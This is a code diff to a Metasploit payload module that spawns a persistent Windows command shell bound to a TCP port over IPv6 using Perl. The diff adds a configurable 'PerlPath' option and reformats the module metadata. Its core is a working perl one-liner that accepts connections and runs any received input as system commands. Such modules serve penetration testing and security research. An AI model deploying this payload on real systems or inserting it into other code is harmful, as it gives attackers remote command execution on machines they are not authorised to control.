@@ -13,22 +13,27 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Windows Command Shell, Bind TCP (via perl) IPv6',
-      'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
-      'Author'        => ['Samy <samy[at]samy.pl>', 'cazz', 'aushack'],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'perl',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+     'Name'          => 'Windows Command Shell, Bind TCP (via perl) IPv6',
+     'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
+     'Author'        => ['Samy <samy[at]samy.pl>', 'cazz', 'aushack'],
+     'License'       => BSD_LICENSE,
+     'Platform'      => 'win',
+     'Arch'          => ARCH_CMD,
+     'Handler'       => Msf::Handler::BindTcp,
+     'Session'       => Msf::Sessions::CommandShell,
+     'PayloadType'   => 'cmd',
+     'RequiredCmd'   => 'perl',
+     'Payload'       =>
+       {
+         'Offsets' => { },
+         'Payload' => ''
+       }
+    ))
+    register_advanced_options(
+      [
+        OptString.new('PerlPath', [true, 'The path to the Perl executable', 'perl'])
+      ]
+    )
   end
 
   #
@@ -43,7 +48,7 @@ module MetasploitModule
   #
   def command_string
 
-    cmd = "perl -MIO -e \"while($c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""
+    cmd = "#{datastore['PerlPath']} -MIO -e \"while($c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}\""
 
     return cmd
   end
